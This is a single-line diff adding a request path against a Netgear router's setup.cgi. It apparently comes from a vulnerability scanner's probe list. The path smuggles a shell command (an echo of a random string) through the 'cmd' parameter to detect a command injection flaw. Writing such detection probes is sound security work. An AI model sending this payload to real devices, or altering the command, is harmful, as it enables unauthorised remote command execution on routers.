@@ -1,0 +1,1 @@
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=echo%20{{randstr}}&curpath=/&currentsetting.htm=1
